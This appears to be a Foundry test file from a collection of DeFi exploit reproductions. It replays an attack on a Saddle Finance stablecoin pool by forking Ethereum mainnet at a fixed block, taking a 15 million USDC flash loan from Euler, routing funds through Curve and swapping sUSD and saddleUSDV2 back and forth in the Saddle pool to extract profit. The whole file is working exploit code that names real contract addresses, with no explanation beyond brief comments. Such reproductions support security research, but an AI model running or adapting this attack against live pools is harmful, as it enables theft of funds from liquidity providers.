// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IEuler {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface ISaddle {
    function swap(uint8 i, uint8 j, uint256 dx, uint256 min_dy, uint256 deadline) external returns (uint256);
}

contract ContractTest is Test {
    address private constant eulerLoans = 0x07df2ad9878F8797B4055230bbAE5C808b8259b3;
    address private constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant saddleUsdV2 = 0x5f86558387293b6009d7896A61fcc86C17808D62;
    address private constant curvepool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address private constant saddlepool = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_684_306);
    }

    function testExploit() public {
        IEuler(eulerLoans).flashLoan(address(this), usdc, 15_000_000e6, new bytes(0));
        console.log("USDC hacked: %s", IERC20(usdc).balanceOf(address(this)));
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        attack();

        //Repay Loan
        IERC20(usdc).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() internal {
        //Swap USDC to SUSD Via Curve
        console.log("USDC loaned: %s", IERC20(usdc).balanceOf(address(this)));
        uint256 amount = IERC20(usdc).balanceOf(address(this));
        IERC20(usdc).approve(curvepool, amount);
        ICurve(curvepool).exchange(1, 3, amount, 1);
        console.log("SUSD exchanged: %s", IERC20(susd).balanceOf(address(this)));

        //Attack
        swapToSaddle(IERC20(susd).balanceOf(address(this)));
        swapFromSaddle();

        //Swap Susd to USDC via curve
        amount = IERC20(susd).balanceOf(address(this));
        IERC20(susd).approve(curvepool, amount);
        ICurve(curvepool).exchange(3, 1, amount, 1);
        console.log("USDC exchanged: %s", IERC20(usdc).balanceOf(address(this)));
    }

    function swapToSaddle(uint256 amountStart) internal {
        //Swap SUSD for SaddleUSDV2
        uint256 amount = amountStart;
        IERC20(susd).approve(saddlepool, amount);
        ISaddle(saddlepool).swap(0, 1, amount, 1, block.timestamp);
        console.log("saddleUsdV2 swapped: %s", IERC20(saddleUsdV2).balanceOf(address(this)));
    }

    function swapFromSaddle() internal {
        //Swap SaddleUSDV2 for SUSD
        uint256 amount = IERC20(saddleUsdV2).balanceOf(address(this));
        IERC20(saddleUsdV2).approve(saddlepool, amount);
        ISaddle(saddlepool).swap(1, 0, amount, 1, block.timestamp);
        console.log("SUSD swapped: %s", IERC20(susd).balanceOf(address(this)));
    }
}
